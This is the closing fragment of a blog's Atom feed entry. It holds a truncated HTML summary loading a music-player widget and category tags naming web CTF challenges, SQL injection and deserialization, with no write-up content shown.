    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;js&#92;APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="webwp" scheme="http://fybc.xyz/categories/webwp/"/>
    
    
    <category term="web" scheme="http://fybc.xyz/tags/web/"/>
    
    <category term="ctf" scheme="http://fybc.xyz/tags/ctf/"/>
    
    <category term="sql注入" scheme="http://fybc.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="反序列化" scheme="http://fybc.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
